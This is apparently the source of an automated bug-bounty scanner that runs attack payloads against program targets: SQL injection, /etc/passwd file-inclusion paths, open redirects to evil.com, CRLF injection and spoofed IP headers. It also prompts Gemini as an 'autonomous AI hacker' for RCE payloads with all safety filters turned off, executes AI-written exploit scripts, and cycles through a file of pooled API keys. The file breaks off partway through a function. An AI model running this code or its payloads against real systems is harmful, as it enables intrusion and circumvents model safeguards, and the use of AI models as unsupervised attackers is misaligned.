import sys
import os
import json
import time
import argparse
import requests
import urllib3
import subprocess
import platform
import random
import re
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

os.environ["PYTHONIOENCODING"] = "utf-8"
try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass

# --- Awesome Bug Bounty Tools — Full Scanner Suite ---
try:
    from scanners.xss import check_xss, check_dom_xss
    from scanners.ssrf import check_ssrf
    from scanners.ssti import check_ssti
    from scanners.csrf import check_csrf
    from scanners.xxe import check_xxe
    from scanners.smuggling import check_request_smuggling
    from scanners.race import check_race_condition
    from scanners.cache_poison import check_cache_poisoning
    from scanners.jwt import check_jwt_vulnerabilities
    from scanners.cms import check_cms_vulnerabilities
    from scanners.buckets import check_s3_buckets
    from scanners.git_exposure import check_git_exposure
    from scanners.dir_traversal import check_directory_traversal
    from scanners.waf import detect_waf
    from scanners.port_scan import check_ports
    from scanners.tech_detect import check_technologies
    from scanners.param_discovery import discover_parameters
    from scanners.link_discovery import discover_links_and_js
    from scanners.secrets_advanced import check_advanced_secrets
    from scanners.deserialization import check_insecure_deserialization
    from scanners.postmessage import check_postmessage
    from scanners.subdomain_permutation import generate_permutations
    from scanners.command_injection import check_command_injection
    from scanners.idor_advanced import check_idor_advanced
    from scanners.api_versioning import check_api_versioning
    from scanners.rate_limit import check_rate_limit
    from scanners.js_analyzer import check_js_analyzer
    from scanners.api_schema import check_api_schema
    from scanners.mass_assignment_fuzzer import run_mass_assignment_fuzzer
    from scanners.wcd_advanced import run_wcd_scan
    from scanners.cloud_ssrf_fuzzer import run_cloud_ssrf_fuzzer
    from scanners.dorking import run_dorking
    from scanners.graphql_parser import check_graphql
    from scanners.cve_scanner import run_cve_scans
    from scanners.hardcoded_fuzzer import check_hardcoded_payloads
    from scanners.sqlmap_fuzzer import run_sqlmap_scan
    from scanners.commix_fuzzer import run_commix_scan
    from scanners.xsstrike_fuzzer import run_xsstrike_scan
    from scanners.arjun_fuzzer import run_arjun_scan
    from scanners.ssrfmap_fuzzer import run_ssrfmap_scan
    from scanners.headless_traffic_analyzer import run_headless_crawler_analyzer
    from scanners.js_secrets_hunter import hunt_js_secrets
    from scanners.wayback_scraper import fetch_wayback_urls
    from scanners.subdomain_takeover import check_subdomain_takeover
    from scanners.cors_scanner import check_cors_misconfig
    from scanners.naabu_scanner import run_naabu_scan
    from scanners.graphql_dumper import check_graphql_introspection
    from scanners.host_header_fuzzer import run_host_header_fuzzer
    from scanners.open_redirect_fuzzer import run_open_redirect_fuzzer
    from scanners.jwt_fuzzer import run_jwt_fuzzer
    from scanners.lfi_fuzzer import run_lfi_fuzzer
    from scanners.race_condition_h2 import run_h2_race_condition
    from scanners.oob_ssrf import run_oob_ssrf
    from scanners.prototype_pollution import run_prototype_pollution
    from scanners.smuggling_advanced import run_smuggling_advanced
    from scanners.oauth_hijack import run_oauth_hijack
    from scanners.graphql_batching import run_graphql_batching
    from scanners.swagger_matrix import run_swagger_matrix
    from scanners.ssti_fuzzer import run_ssti_fuzzer
    from scanners.dom_xss_tracer import run_dom_xss_tracer
    from scanners.waf_evasion import run_waf_evasion
    from modules.payload_extractor import extract_payloads
    
    # Dynamically load AI-generated custom tools
    import importlib
    import pkgutil
    import scanners.custom_tools
    CUSTOM_SCANNERS = []
    for _, module_name, _ in pkgutil.iter_modules(scanners.custom_tools.__path__):
        try:
            mod = importlib.import_module(f"scanners.custom_tools.{module_name}")
            for attr in dir(mod):
                if attr.startswith("run_"):
                    CUSTOM_SCANNERS.append(getattr(mod, attr))
        except Exception as e:
            print(f"[!] Failed to load custom tool {module_name}: {e}")
            
    SCANNERS_LOADED = True
except ImportError as e:
    print(f"[!] Some scanner modules not loaded: {e}")
    SCANNERS_LOADED = False

# --- Feature Modules ---
try:
    from modules.ai_triage import ai_triage_finding, batch_triage
    from modules.idor_detector import DualSessionIDORDetector, check_idor_dual_session
    from modules.state_diff import StateDiffEngine
    from modules.waf_evasion import WAFEvasionEngine, is_waf_blocked
    from modules.context_payloads import ContextPayloadGenerator
    FEATURES_LOADED = True
except ImportError as e:
    print(f"[!] Some feature modules not loaded: {e}")
    FEATURES_LOADED = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Config ---
MODELS = ["gemini-1.5-pro", "gemini-1.5-flash", "gemini-2.5-flash"]
TARGETS_DIR = Path("data/selected_targets")
DATA_DIR = Path("data")
RESULTS_DIR = Path("data/autopilot")
RESULTS_DIR.mkdir(parents=True, exist_ok=True)
REPORTS_DIR = Path('reports')
REPORTS_DIR.mkdir(parents=True, exist_ok=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
]

def get_stealth_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "X-Hackerone": "suppliertest"
    }

ENV_VARS = {}
if Path(".env").exists():
    for line in Path(".env").read_text().splitlines():
        if "=" in line and not line.startswith("#"):
            k, v = line.split("=", 1)
            ENV_VARS[k.strip()] = v.strip()

DISCORD_WEBHOOK_URL = ENV_VARS.get("DISCORD_WEBHOOK_URL", "")
GEMINI_API_KEY = ENV_VARS.get("GEMINI_API_KEY", "")
GEMINI_API_KEY = ENV_VARS.get("GEMINI_API_KEY", "").strip('"\'')
SHODAN_API_KEY = ENV_VARS.get("SHODAN_API_KEY", "")
NOTION_API_KEY = ENV_VARS.get("NOTION_API_KEY", "")
NOTION_DATABASE_ID = ENV_VARS.get("NOTION_DATABASE_ID", "")
DEFECTDOJO_URL = ENV_VARS.get("DEFECTDOJO_URL", "")
DEFECTDOJO_API_KEY = ENV_VARS.get("DEFECTDOJO_API_KEY", "")
TELEGRAM_BOT_TOKEN = ENV_VARS.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = ENV_VARS.get("TELEGRAM_CHAT_ID", "")
SLACK_WEBHOOK_URL = ENV_VARS.get("SLACK_WEBHOOK_URL", "")
JIRA_URL = ENV_VARS.get("JIRA_URL", "")
JIRA_EMAIL = ENV_VARS.get("JIRA_EMAIL", "")
JIRA_API_TOKEN = ENV_VARS.get("JIRA_API_TOKEN", "")
JIRA_PROJECT_KEY = ENV_VARS.get("JIRA_PROJECT_KEY", "")
GITHUB_BACKUP_REPO = ENV_VARS.get("GITHUB_BACKUP_REPO", "")
FREELLMAPI_URL = ENV_VARS.get("FREELLMAPI_URL", "http://localhost:3001/v1")
FREELLMAPI_KEY = ENV_VARS.get("FREELLMAPI_KEY", "")
INTERACTSH_URL = ENV_VARS.get("INTERACTSH_URL", "")
NEO4J_URI = ENV_VARS.get("NEO4J_URI", "bolt://neo4j:7687")
NEO4J_USER = ENV_VARS.get("NEO4J_USER", "neo4j")
NEO4J_PASSWORD = ENV_VARS.get("NEO4J_PASSWORD", "password123")

# IDOR dual-session credentials (optional — configure per target)
IDOR_CREDENTIALS = {}
try:
    idor_creds_path = Path("data/idor_credentials.json")
    if idor_creds_path.exists():
        IDOR_CREDENTIALS = json.loads(idor_creds_path.read_text(encoding="utf-8"))
except: pass

# State-Diff engine (persistent across runs)
STATE_DIFF_ENGINE = None
if FEATURES_LOADED:
    STATE_DIFF_ENGINE = StateDiffEngine("data/state_snapshots")

def send_discord(msg):
    if not DISCORD_WEBHOOK_URL or "your_discord_webhook" in DISCORD_WEBHOOK_URL:
        return
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"content": msg}, timeout=3)
    except: pass

def send_discord_webhook(finding):
    if not DISCORD_WEBHOOK_URL or "your_discord_webhook" in DISCORD_WEBHOOK_URL:
        return
    if finding.get("severity") not in ["HIGH", "CRITICAL"]:
        return
    confidence = finding.get("confidence", "LOW")
    if confidence == "LOW":
        return  # Don't spam Discord with unverified findings
    verified = "✅ VERIFIED" if finding.get("verified") else ""
    conf_emoji = {"HIGH": "🟢", "MEDIUM": "🟡"}.get(confidence, "⚪")
    msg = (f"🚨 **{finding.get('severity')} Vulnerability Found!** {verified}\n"
           f"**Confidence**: {conf_emoji} {confidence}\n"
           f"**Type**: {finding.get('type')}\n"
           f"**URL**: {finding.get('url')}\n"
           f"**Program**: {finding.get('program')}\n"
           f"**Detail**: {finding.get('detail', 'N/A')}")
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"content": msg}, timeout=3)
    except: pass
def _call_gemini_helper(prompt, api_key):
    import requests
    if not api_key or "your_" in api_key: return None
    api_url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key={api_key}"
    payload = {"contents": [{"parts":[{"text": prompt}]}]}
    try:
        r = requests.post(api_url, json=payload, headers={"Content-Type": "application/json"}, timeout=15)
        return r.json()['candidates'][0]['content']['parts'][0]['text']
    except:
        return None

def _call_groq_helper(prompt):
    import requests
    import os
    api_key = os.getenv("GROQ_API_KEY")
    if not api_key or "your_" in api_key: return None
    api_url = "https://api.groq.com/openai/v1/chat/completions"
    headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
    payload = {"model": "llama3-70b-8192", "messages": [{"role": "user", "content": prompt}], "temperature": 0.1}
    try:
        r = requests.post(api_url, json=payload, headers=headers, timeout=15)
        return r.json()['choices'][0]['message']['content']
    except:
        return None

def _call_freellmapi_helper(prompt):
    import requests
    if not FREELLMAPI_KEY or "your_" in FREELLMAPI_KEY: return None
    headers = {"Authorization": f"Bearer {FREELLMAPI_KEY}", "Content-Type": "application/json"}
    payload = {"model": "auto", "messages": [{"role": "user", "content": prompt}]}
    try:
        r = requests.post(f"{FREELLMAPI_URL}/chat/completions", json=payload, headers=headers, timeout=30)
        return r.json()['choices'][0]['message']['content']
    except:
        return None

def _call_claude_helper(prompt):
    import requests
    from pathlib import Path
    keys_file = Path("data/anthropic_keys.txt")
    if not keys_file.exists(): return None
    keys = [k.strip() for k in keys_file.read_text().splitlines() if k.strip()]
    if not keys: return None

    for key in list(keys):
        headers = {
            "x-api-key": key,
            "anthropic-version": "2023-06-01",
            "content-type": "application/json"
        }
        payload = {
            "model": "claude-3-haiku-20240307",
            "max_tokens": 2048,
            "messages": [{"role": "user", "content": prompt}]
        }
        try:
            r = requests.post("https://api.anthropic.com/v1/messages", json=payload, headers=headers, timeout=15)
            if r.status_code == 200:
                keys.remove(key)
                keys.append(key)
                keys_file.write_text("\n".join(keys))
                return r.json()["content"][0]["text"]
            elif r.status_code in [401, 403]:
                keys.remove(key)
                keys_file.write_text("\n".join(keys))
            elif r.status_code == 429:
                keys.remove(key)
                keys.append(key)
                keys_file.write_text("\n".join(keys))
        except:
            pass
    return None

def get_ai_response(prompt):
    claude_res = _call_claude_helper(prompt)
    if claude_res: return claude_res
    if GEMINI_API_KEY and "your_" not in GEMINI_API_KEY:
        res = _call_gemini_helper(prompt, GEMINI_API_KEY)
        if res: return res
    if FREELLMAPI_KEY and "your_" not in FREELLMAPI_KEY:
        res = _call_freellmapi_helper(prompt)
        if res: return res
    return _call_groq_helper(prompt)

def generate_ai_report(finding):
    has_gemini = GEMINI_API_KEY and "your_" not in GEMINI_API_KEY
    from pathlib import Path
    has_claude = Path("data/anthropic_keys.txt").exists() and len(Path("data/anthropic_keys.txt").read_text().strip()) > 10
    if not has_gemini and not has_claude: return
    if finding.get("severity") not in ["HIGH", "CRITICAL"]: return
    if finding.get("confidence", "LOW") == "LOW": return
    
    proof_section = ""
    if finding.get("proof"):
        proof_section = f"\n\nAUTOMATED PROOF OF CONCEPT OUTPUT:\n{finding['proof']}\n\nPoC Script Path: {finding.get('poc_script', 'N/A')}"
    
    prompt = (f"Write a professional HackerOne bug bounty report for a {finding.get('severity')} severity "
              f"{finding.get('type')} vulnerability on {finding.get('url')}.\n"
              f"Detail: {finding.get('detail', 'N/A')}\n"
              f"Confidence: {finding.get('confidence', 'N/A')}\n"
              f"{proof_section}\n\n"
              f"Include: Description, Steps to Reproduce, Impact, Proof of Concept, and Remediation & Patch Advice. "
              f"If automated proof output is provided above, include it as evidence.")
    try:
        report_text = get_ai_response(prompt)
        if not report_text: return
        safe_name = finding.get('type', 'vuln').replace(' ', '_')[:30]
        report_path = REPORTS_DIR / f"report_{safe_name}_{int(time.time())}.md"
        report_path.write_text(report_text, encoding="utf-8")
        log(f"[+] AI generated full bug report at {report_path}")
    except Exception as e: pass

def ai_exploit_and_prove(finding):
    """AI generates a safe PoC exploit, runs it, captures proof for the report."""
    has_gemini = GEMINI_API_KEY and "your_" not in GEMINI_API_KEY
    from pathlib import Path
    has_claude = Path("data/anthropic_keys.txt").exists() and len(Path("data/anthropic_keys.txt").read_text().strip()) > 10
    if not has_gemini and not has_claude: return None
    if finding.get("severity") not in ["MEDIUM", "HIGH", "CRITICAL"]: return None
    if finding.get("confidence", "LOW") == "LOW": return None
    
    vuln_type = finding.get("type", "")
    target_url = finding.get("url", "")
    detail = finding.get("detail", "")
    
    prompt = (f"You are an expert penetration tester. Write a safe, read-only Python PoC script.\n"
              f"Vulnerability: {vuln_type}\nURL: {target_url}\nDetails: {detail}\n\n"
              f"The script MUST:\n"
              f"1. Send HTTP request(s) that demonstrate this vulnerability\n"
              f"2. Print evidence (headers, timing, reflected values, status codes)\n"
              f"3. Print 'VERIFIED: VULNERABLE' or 'NOT VERIFIED' as the LAST line\n"
              f"4. Use ONLY requests and time libraries\n"
              f"5. Be read-only, no destructive actions, complete in under 15 seconds\n\n"
              f"Output ONLY raw Python code. No markdown, no explanation.")
    
    try:
        script = get_ai_response(prompt)
        if not script: return None
        script = script.strip()
        
        # Clean markdown
        if script.startswith("```python"): script = script[9:]
        if script.startswith("```"): script = script[3:]
        if script.endswith("```"): script = script[:-3]
        script = script.strip()
        
        # Safety: block dangerous operations
        dangerous = ["os.system", "subprocess", "open(", ".write(", "unlink", "rmdir",
                     "shutil", "eval(", "exec(", "import os", "__import__", "remove("]
        if any(d in script for d in dangerous):
            log(f"[!] AI PoC blocked — contains unsafe operations")
            return None
        
        # Save and execute
        poc_dir = Path("reports/poc")
        poc_dir.mkdir(parents=True, exist_ok=True)
        safe_type = re.sub(r'[^a-zA-Z0-9_]', '_', vuln_type)[:30]
        ts = int(time.time())
        poc_file = poc_dir / f"poc_{safe_type}_{ts}.py"
        poc_file.write_text(script, encoding="utf-8")
        
        log(f"[*] Running AI PoC for {vuln_type}...")
        result = subprocess.run(
            [sys.executable, str(poc_file)],
            capture_output=True, text=True, timeout=20
        )
        
        output = result.stdout.strip()
        verified = "VERIFIED: VULNERABLE" in output
        
        # Save proof
        proof = {
            "finding_type": vuln_type, "url": target_url,
            "poc_script": script, "poc_output": output,
            "verified": verified, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        proof_file = poc_dir / f"proof_{safe_type}_{ts}.json"
        proof_file.write_text(json.dumps(proof, indent=2), encoding="utf-8")
        
        if verified:
            log(f"[+] ✅ AI PoC VERIFIED: {vuln_type} at {target_url}")
            finding["proof"] = output
            finding["poc_script"] = str(poc_file)
            finding["verified"] = True
        else:
            log(f"[-] AI PoC could not verify: {vuln_type} (likely false positive)")
            finding["verified"] = False
        return proof
    except subprocess.TimeoutExpired:
        log(f"[-] AI PoC timed out for {vuln_type}")
    except Exception as e:
        log(f"[-] AI PoC error: {e}")
    return None

CORS_ORIGINS = ["https://evil.com"]
SQLI_PAYLOADS = ["' OR '1'='1", "'; WAITFOR DELAY '0:0:5'--"]
SQLI_PARAMS = ["id", "req", "user"]
ASP_ENDPOINTS = ["/chkrequest.asp", "/hr.asp", "/qp.asp", "/login.php"]
IDOR_ENDPOINTS = ["/rentalcars/contract", "/api/v1/user", "/profile"]
IDOR_PARAMS = ["id", "userId", "bookingId"]
TEST_IDS = ["1", "admin"]
INTERESTING_PATHS = ["/robots.txt", "/.env", "/api/v1/", "/admin", "/.git/config"]


def safe_request(method, url, **kwargs):
    retries = kwargs.pop('retries', 3)
    backoff = kwargs.pop('backoff', 1.0)
    for attempt in range(retries):
        try:
            r = requests.request(method, url, **kwargs)
            if r.status_code == 429:
                time.sleep(backoff * (attempt + 1))
                continue
            return r
        except requests.exceptions.RequestException:
            if attempt == retries - 1:
                raise
            time.sleep(backoff)
    return None

def create_defectdojo_finding(finding):
    if not DEFECTDOJO_URL or not DEFECTDOJO_API_KEY or "your_" in DEFECTDOJO_API_KEY: return
    try:
        url = f"{DEFECTDOJO_URL.rstrip('/')}/api/v2/findings/"
        headers = {
            "Authorization": f"Token {DEFECTDOJO_API_KEY}",
            "Content-Type": "application/json"
        }
        data = {
            "title": f"{finding.get('type')} on {finding.get('url')}",
            "description": f"Detail: {finding.get('detail')}\nConfidence: {finding.get('confidence')}",
            "severity": finding.get('severity').capitalize(),
            "active": True,
            "verified": finding.get('verified', False),
            "vuln_type": finding.get('type')
        }
        requests.post(url, headers=headers, json=data, timeout=5)
    except: pass

def send_telegram_alert(finding):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID: return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        msg = (f"🚨 <b>{finding.get('severity')} Vulnerability Found!</b>\n"
               f"<b>Type:</b> {finding.get('type')}\n"
               f"<b>URL:</b> {finding.get('url')}\n"
               f"<b>Detail:</b> {finding.get('detail')}")
        keyboard = {
            "inline_keyboard": [[
                {"text": "✅ Confirm", "callback_data": f"confirm_{finding.get('type')}"},
                {"text": "❌ False Positive", "callback_data": f"fp_{finding.get('type')}"}
            ]]
        }
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": msg,
            "parse_mode": "HTML",
            "reply_markup": json.dumps(keyboard)
        }
        requests.post(url, json=data, timeout=5)
    except: pass

def send_slack_webhook(finding):
    if not SLACK_WEBHOOK_URL or "your_" in SLACK_WEBHOOK_URL: return
    try:
        msg = f"🚨 *{finding.get('severity')} Vulnerability Found!*\n*Type:* {finding.get('type')}\n*URL:* {finding.get('url')}\n*Detail:* {finding.get('detail')}"
        requests.post(SLACK_WEBHOOK_URL, json={"text": msg}, timeout=5)
    except: pass

def create_jira_ticket(finding):
    if not JIRA_URL or not JIRA_API_TOKEN or "your_" in JIRA_API_TOKEN: return
    try:
        url = f"{JIRA_URL.rstrip('/')}/rest/api/2/issue"
        auth = (JIRA_EMAIL, JIRA_API_TOKEN)
        data = {
            "fields": {
                "project": {"key": JIRA_PROJECT_KEY},
                "summary": f"[{finding.get('severity')}] {finding.get('type')} on {finding.get('url')}",
                "description": f"Vulnerability Details:\n\nType: {finding.get('type')}\nURL: {finding.get('url')}\nDetail: {finding.get('detail')}\nConfidence: {finding.get('confidence')}",
                "issuetype": {"name": "Bug"}
            }
        }
        requests.post(url, json=data, auth=auth, timeout=5)
    except: pass

def create_notion_ticket(finding):
    if not NOTION_API_KEY or "your_" in NOTION_API_KEY: return
    if not NOTION_DATABASE_ID or "your_" in NOTION_DATABASE_ID: return
    try:
        url = "https://api.notion.com/v1/pages"
        headers = {"Authorization": f"Bearer {NOTION_API_KEY}", "Content-Type": "application/json", "Notion-Version": "2022-06-28"}
        data = {
            "parent": { "database_id": NOTION_DATABASE_ID },
            "properties": {
                "Name": { "title": [ { "text": { "content": f"[{finding.get('severity')}] {finding.get('type')} on {finding.get('program')}" } } ] },
                "Status": { "status": { "name": "Triage" } },
                "Severity": { "select": { "name": finding.get('severity') } },
                "URL": { "url": finding.get('url') }
            }
        }
        requests.post(url, headers=headers, json=data, timeout=5)
    except: pass

def log(msg):
    print(f"[*] {msg}", flush=True)

class ScopeManager:
    def __init__(self, data):
        self.in_scope = []
        self.out_of_scope = []
        for s in data.get("scope", {}).get("all", []):
            asset = s.get("asset_identifier", "").strip().lower()
            if not asset: continue
            
            # Simple wildcard to regex conversion
            # e.g. *.vimeo.com -> .*\.vimeo\.com
            escaped = re.escape(asset).replace(r'\*', '.*')
            pattern = f"^{escaped}$" if '*' not in asset else escaped
            
            try:
                prog = re.compile(pattern)
            except:
                continue
                
            instruction = s.get("instruction", "").lower()
            eligible = s.get("eligible_for_submission", True)
            
            is_oos = not eligible or "out of scope" in instruction or "do not test" in instruction or "out-of-scope" in instruction or "not accepted" in instruction
            
            if is_oos:
                self.out_of_scope.append(prog)
            else:
                self.in_scope.append(prog)

    def is_in_scope(self, url):
        try:
            domain = urlparse(url).hostname
            if not domain: return False
            domain = domain.lower()
        except:
            return False
            
        for p in self.out_of_scope:
            if p.search(domain) or p.search(url.lower()):
                return False
                
        for p in self.in_scope:
            if p.search(domain) or p.search(url.lower()):
                return True
                
        return False

def load_targets():
    targets = {}
    if not TARGETS_DIR.exists(): return targets
    for f in TARGETS_DIR.glob("*.json"):
        handle = f.stem
        try:
            data = json.loads(f.read_text(encoding="utf-8"))
            scope_mgr = ScopeManager(data)
            urls = set()
            for s in data.get("scope", {}).get("all", []):
                atype = s.get("asset_type", "").upper()
                if atype in ("APPLE_STORE_APP_ID", "GOOGLE_PLAY_APP_ID", "HARDWARE", "WINDOWS_APP", "OTHER_APK", "CIDR", "SOURCE_CODE", "EXECUTABLE"):
                    continue
                asset = s.get("asset_identifier", "")
                if asset and len(asset) > 3 and " " not in asset and not asset.isdigit() and "*" not in asset:
                    clean = asset.strip().rstrip("/")
                    if not clean.startswith("http"): clean = f"https://{clean}"
                    urls.add(clean)
            
            filtered_urls = [u for u in urls if scope_mgr.is_in_scope(u)]
            targets[handle] = {"urls": list(filtered_urls)[:50], "scope_mgr": scope_mgr}
        except Exception:
            pass
    return targets

# --- Scan Modules ---

def check_blind_oob(url):
    if not INTERACTSH_URL or "your_" in INTERACTSH_URL: return None
    try:
        headers = get_stealth_headers()
        headers["X-Forwarded-For"] = f"http://{INTERACTSH_URL}"
        headers["User-Agent"] = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) curl/7.68.0 http://{INTERACTSH_URL}"
        test_url = f"{url}?callback=https://{INTERACTSH_URL}&url=https://{INTERACTSH_URL}"
        requests.get(test_url, headers=headers, timeout=3, verify=True)
    except: pass
    return None


def check_headless_spa(url):
    findings = []
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            def handle_request(request):
                if "api" in request.url and request.method in ["POST", "PUT", "DELETE"]:
                    findings.append({"type": "HIDDEN_API_STATE_CHANGE", "url": request.url, "severity": "MEDIUM", "detail": f"Discovered background {request.method} API call via Headless SPA render"})
            page.on("request", handle_request)
            page.goto(url, timeout=10000, wait_until="networkidle")
            browser.close()
    except Exception: pass
    return findings if findings else None


def push_to_graph(finding):
    try:
        from neo4j import GraphDatabase
        driver = GraphDatabase.driver(NEO4J_URI, auth=(NEO4J_USER, NEO4J_PASSWORD))
        program = finding.get('program', 'unknown')
        url = finding.get('url', '')
        v_type = finding.get('type', 'unknown')
        severity = finding.get('severity', 'LOW')
        domain = urlparse(url).hostname if url else "unknown"
        
        # Check for prior reports of this type on this program to assess duplicate risk
        check_query = '''
        MATCH (f:Finding {type: $v_type, program: $program})
        RETURN count(f) as prior_reports
        '''
        
        insert_query = '''
        MERGE (p:Program {name: $program})
        MERGE (d:Domain {name: $domain})
        MERGE (vt:VulnType {name: $v_type})
        MERGE (v:Finding {type: $v_type, url: $url, severity: $severity, program: $program})
        MERGE (v)-[:STATUS]->(s:Status {state: 'pending'})
        MERGE (v)-[:TYPE]->(vt)
        MERGE (p)-[:OWNS]->(d)
        MERGE (d)-[:HAS_VULN]->(v)
        '''
        
        prior_reports = 0
        with driver.session() as session:
            result = session.run(check_query, v_type=v_type, program=program)
            for record in result:
                prior_reports = record["prior_reports"]
            
            session.run(insert_query, program=program, domain=domain, v_type=v_type, url=url, severity=severity)
            
        driver.close()
        return prior_reports
    except Exception as e:
        return 0


def ai_autonomous_exploit(url):
    if not GEMINI_API_KEY or "your_" in GEMINI_API_KEY: return None
    log(f"[*] Autonomous AI analyzing {url} for custom exploits...")
    
    try:
        from modules.payload_extractor import extract_payloads
        import random
        db = extract_payloads()
        flat_payloads = []
        for v in db.values(): flat_payloads.extend(v)
        sample = random.sample(flat_payloads, min(20, len(flat_payloads))) if flat_payloads else []
        payload_ctx = f"Reference these payloads: {', '.join(sample)}"
    except Exception:
        payload_ctx = ""

    prompt = f"You are an autonomous AI hacker. Analyze this URL: {url}. Provide exactly 3 highly advanced, context-specific payload strings (separated by newlines) to inject into its parameters for RCE or advanced SQLi. {payload_ctx} Do not include any explanations, just the raw payloads."
    model = random.choice(MODELS)
    api_url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={GEMINI_API_KEY}"
    payload = {"contents": [{"parts":[{"text": prompt}]}]}
    findings = []
    try:
        payload["safetySettings"] = [
            {"category": "HARM_CATEGORY_DANGEROUS_CONTENT", "threshold": "BLOCK_NONE"},
            {"category": "HARM_CATEGORY_HARASSMENT", "threshold": "BLOCK_NONE"},
            {"category": "HARM_CATEGORY_HATE_SPEECH", "threshold": "BLOCK_NONE"},
            {"category": "HARM_CATEGORY_SEXUALLY_EXPLICIT", "threshold": "BLOCK_NONE"}
        ]
        r = requests.post(api_url, json=payload, headers={"Content-Type": "application/json"}, timeout=10)
        payloads = r.json()['candidates'][0]['content']['parts'][0]['text'].strip().split('\n')
        for p in payloads:
            p = p.strip().strip('"').strip("'")
            if not p: continue
            headers = get_stealth_headers()
            test_url = f"{url}?id={requests.utils.quote(p)}&q={requests.utils.quote(p)}"
            resp = requests.get(test_url, headers=headers, timeout=5, verify=False)
            if "root:x:0:0" in resp.text or "syntax error" in resp.text.lower():
                findings.append({"type": "AI_AUTONOMOUS_EXPLOIT_SUCCESS", "url": test_url, "severity": "CRITICAL", "detail": f"AI Successfully exploited endpoint using custom payload: {p[:30]}..."})
    except: pass
    return findings if findings else None


def generate_nuclei_template(finding):
    if not GEMINI_API_KEY or "your_" in GEMINI_API_KEY: return
    if finding.get("type") not in ["AI_AUTONOMOUS_EXPLOIT_SUCCESS", "HIDDEN_API_STATE_CHANGE"]: return
    template_dir = Path("custom-templates")
    template_dir.mkdir(exist_ok=True)
    prompt = f"You are a security engineer writing a Nuclei YAML template.\nBased on this finding:\nType: {finding.get('type')}\nURL: {finding.get('url')}\nDetail: {finding.get('detail')}\n\nWrite a raw Nuclei YAML template. Do NOT use markdown code blocks."
    try:
        import time
        yaml_content = get_ai_response(prompt)
        if not yaml_content: return
        yaml_content = yaml_content.strip()
        if yaml_content.startswith("```yaml"): yaml_content = yaml_content[7:]
        if yaml_content.endswith("```"): yaml_content = yaml_content[:-3]
        yaml_content = yaml_content.strip()
        safe_id = f"ai_template_{int(time.time())}.yaml"
        template_path = template_dir / safe_id
        template_path.write_text(yaml_content, encoding="utf-8")
        log(f"[+] AI self-learned and generated a new custom Nuclei template at {template_path}")
    except Exception as e: pass

TAKEOVER_FINGERPRINTS = [
    ("NoSuchBucket", "AWS S3"), ("There isn't a GitHub Pages site here", "GitHub Pages"),
    ("Heroku | No such app", "Heroku"), ("404 Blog is not found", "Tumblr"),
    ("Do you want to register", "WordPress.com"), ("project not found", "Surge.sh"),
    ("Unrecognized domain", "Helpjuice"), ("The specified bucket does not exist", "AWS S3"),
]

def check_open_redirect(url):
    try:
        payloads = ["//evil.com", "https://evil.com", "/%09/evil.com", "https:evil.com"]
        params = ["url", "redirect", "next", "return", "go", "redirect_uri"]
        
        parsed = urlparse(url)
        for param in params:
            for payload in payloads:
                target = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={payload}"
                r = requests.get(target, headers=get_stealth_headers(), timeout=5, allow_redirects=False, verify=False)
                if r.status_code in [301, 302, 307, 308]:
                    loc = r.headers.get("Location", "")
                    if "evil.com" in loc:
                        return {"type": "OPEN_REDIRECT", "url": target, "severity": "MEDIUM", "confidence": "HIGH",
                                "detail": f"Redirects to {loc}"}
    except Exception: pass
    return None

def check_lfi(url):
    try:
        payloads = ["../../../../etc/passwd", "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "file:///etc/passwd"]
        params = ["file", "page", "doc", "view", "path"]
        
        parsed = urlparse(url)
        for param in params:
            for payload in payloads:
                target = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={payload}"
                r = requests.get(target, headers=get_stealth_headers(), timeout=5, verify=False)
                if "root:x:0:0:" in r.text or "daemon:x:1:" in r.text:
                    return {"type": "LOCAL_FILE_INCLUSION", "url": target, "severity": "CRITICAL", "confidence": "HIGH",
                            "detail": "Successfully read /etc/passwd"}
    except Exception: pass
    return None

def check_crlf(url):
    try:
        payloads = ["/%0D%0ASet-Cookie:crlf=injection", "?q=%0D%0ASet-Cookie:crlf=injection"]
        for payload in payloads:
            target = f"{url.rstrip('/')}{payload}"
            r = requests.get(target, headers=get_stealth_headers(), timeout=5, allow_redirects=False, verify=False)
            if "crlf" in r.cookies or r.headers.get("Set-Cookie", "").find("crlf=injection") != -1:
                return {"type": "CRLF_INJECTION", "url": target, "severity": "MEDIUM", "confidence": "HIGH",
                        "detail": "Injected Set-Cookie header via CRLF"}
    except Exception: pass
    return None

def check_host_header(url):
    try:
        headers = get_stealth_headers()
        headers["Host"] = "evil-host-header.com"
        r = requests.get(url, headers=headers, timeout=5, allow_redirects=False, verify=False)
        if r.status_code in [301, 302, 307, 308]:
            loc = r.headers.get("Location", "")
            if "evil-host-header.com" in loc:
